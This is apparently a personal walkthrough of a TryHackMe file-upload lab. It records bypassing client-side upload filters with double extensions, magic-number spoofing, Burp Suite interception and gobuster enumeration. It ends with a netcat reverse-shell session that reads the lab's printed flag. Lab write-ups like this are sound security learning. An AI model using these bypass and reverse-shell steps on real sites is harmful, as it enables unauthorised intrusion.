@@ -1,0 +1,115 @@
+I was taken to a website named jewel.uploadvulns.thm. Here there is a simple file upload interface
+I was able to successfully upload a .jpg file. 
+
+Attempt 1:
+My first course of action is to just rename my shell file to a shell.jpg.php and see if that works. 
+I was presented with invalid file format. So that's one tick off of the checklist. 
+
+Attempt 2:
+Next I want to edit the magic numbers to check if it does magic number filtering. 
+Doing this I added 4 bytes to the start of my shell: "AAAA" and then went onto a list of file signatures and used hexeditor to change these to jpg's: FF D8 FF E0
+Using file we can verify it worked:
+$ file shell.php
+shell.php: JPEG image data
+Now let's try uploading it to the site. 
+I once again was presented with invalid file format. 
+
+Attempt 3:
+Next I will try a non valid file extension to check if it's using a file blacklist. 
+I created a filetype called .wetrythis, let's upload it and see if it works...
+Once again invalid file format. 
+
+Attempt 4: 
+Next I'll try a form of magic number filtering again just on a normal file extension.
+I changed the .jpg file to a .exe file with the magic numbers: 5A 4D
+It gave back an invalid file format so, I think that we need to spoof both the file extension and the magic numbers. 
+This is validated when I look at the source code and find a upload.js file... I should've looked here first. 
+			//Check File Size
+			if (event.target.result.length > 50 * 8 * 1024){
+				setResponseMsg("File too big", "red");			
+				return;
+			}
+			//Check Magic Number
+			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
+				setResponseMsg("Invalid file format", "red");
+				return;	
+			}
+			//Check File Extension
+			const extension = fileBox.name.split(".")[1].toLowerCase();
+			if (extension != "jpg" && extension != "jpeg"){
+				setResponseMsg("Invalid file format", "red");
+				return;
+			}
+Okay, we know now that we have to get a correct magic number, file length, and file extension. 
+We see here that it's only taking the first file extension after the period so we can do something like .jpg.php:
+fileBox.name.split(".")[1]
+Now that we have our name set to shell.jpg.php let's edit the magic number to a .jpg signature:
+FF D8 FF E0
+Let's upload this and see if we get a success...
+UGHH I got an invalid filetype. Maybe it has to do with length. Let's compare the file size to what it should be.
+Doing the math the file size is making sure nothing is larger than 400 kilobytes. 
+Our shell is 5 kilobytes so there must be something else going on
+I double checked and still got an error. When I open the select and upload screen, it puts me on a .jpeg file types only so that makes me thing it's client-side.
+I will now try some client-side measures because of this.
+
+Attempt 5:
+I'm going to attempt to turn off javascript first to see if that works. The button no longer works so I know that won't work. 
+
+Attempt 6: Time to open up burpsuite, submit a .jpg file with the magic numbers and then 
+change it upon the request. $ mv shell.jpg.php shell.jpg 
+I intercepted the upload and changed the values to this:
+"name":"shell.php","type":"text/x-php"
+However, I still got an error, silly me, I think it's because I need to rename it to "shell.jpg.php"
+So let's try that. 
+"name":"shell.jpg.php","type":"text/x-php"
+I'm still getting invalid file type!
+
+
+Attempt 6:
+One more attempt and I'll look at a guide, now I'm going to intercept the page loading, and change the javascript using burpsuite.
+Did not work, let's look at a guide to see if I missed anything.
+
+Attempt 7:
+WOW it was such a rookie mistake, I never fully enumerated the page. It's written in node.js not php okay, using what I know now, let's do this
+I still think it's client side filtering so we're going to keep using burpsuite. 
+We successfully uploaded the file.
+
+I finally ran gobuster to find out where the files would go:
+gobuster dir -u http://jewel.uploadvulns.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://jewel.uploadvulns.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/content              (Status: 301) [Size: 181] [--> /content/]
+/modules              (Status: 301) [Size: 181] [--> /modules/]
+/admin                (Status: 200) [Size: 1238]
+/assets               (Status: 301) [Size: 179] [--> /assets/]
+
+I'm assuming they will be in /content
+so now we run the /content on gobuster with the wordlist provided:
+gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist_1593564107766.txt -x jpg
+I ran into trouble because apparently you didn't need to hexeditor it, you just needed to delete client side javascript files.
+I went into admin and ran the file using ../content/TMC.jpg and listened using netcat:
+$ nc -nlvp 443                     
+listening on [any] 443 ...
+connect to [10.6.4.208] from (UNKNOWN) [10.10.195.150] 45494
+pwd
+/var/www/html
+cd ..
+ls
+flag.txt
+html
+cat flag.txt
+THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
+
+And we got the flag. I made some rookie mistakes, but I learned a lot!
